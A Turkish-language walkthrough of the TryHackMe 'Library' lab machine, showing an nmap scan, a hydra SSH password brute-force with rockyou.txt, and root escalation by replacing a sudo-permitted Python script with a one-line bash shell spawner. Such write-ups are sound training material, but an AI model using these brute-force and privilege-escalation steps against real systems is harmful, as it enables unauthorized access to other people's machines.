---
title: 'TryHackMe | Library WriteUp'
author: appdone
categories: [TryHackMe Challenges]
tags: [sudo, hydra, brute force]
render_with_liquid: false
---

Bu yazımda TryHackMe platformunda yer alan “Library” isimli meydan okumayı çözeceğim. Öncelikle makine üzerinde çalışan servisleri ve bu servislerin versiyonlarını tespit etmek için nmap aracını kullanacağım.

```console
$ nmap -sC -sV -T4 10.10.123.246
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to  Blog - Library Machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Sadece 80 ve 22 numaralı portların açık olduğunu öğrendik. Versiyonlarında herhangi bir sorun görünmüyor. Web uygulamasında ise bir gönderi ve gönderiyi yazan kişinin ismi bulunuyor. En azından işimize yarayacak tek bilgi bu. Kullanıcı adını öğrendiğimize göre hydra aracı ile deneme yanılma saldırısı yapabiliriz.

```console
$ hydra -l meliodas -P Desktop/rockyou.txt ssh://10.10.123.246
...
[DATA] attacking ssh://10.10.123.246:22/
[22][ssh] host: 10.10.123.246   login: meliodas   password: i******1
```

Biraz bekletti ama kullanıcının parolasını öğrendik. SSH servisine bağlandıktan sonra “sudo -l” komutunu kullandım ve python ile bir dosyayı çalıştırdığını gördüm.

```console
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```

Dosyanın içeriğini aşağıda görüyorsunuz.

```py
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

Gördüğünüz üzere çalıştırıldığında /var/www/html dizinindeki dosyaları /var/backups/website.zip dosyasına yazdırıyor.

Python dosyasını düzenleme yetkimiz bulunmuyor, ancak silebiliyoruz. Sildikten sonra yeni bir bak.py dosyası oluşturacak ve aşağıdaki kodu yazacağız.

```py
import os;os.system("/bin/bash")
```

Böylece dosyayı çalıştırdığımızda root yetkisinde bash’e geçiş yapmış olacağız.

```console
meliodas@ubuntu:~$ rm bak.py 
rm: remove write-protected regular file 'bak.py'? y
meliodas@ubuntu:~$ ls
user.txt
meliodas@ubuntu:~$ nano bak.py
meliodas@ubuntu:~$ sudo /usr/bin/python /home/meliodas/bak.py
root@ubuntu:~# ls /root/
root.txt
```
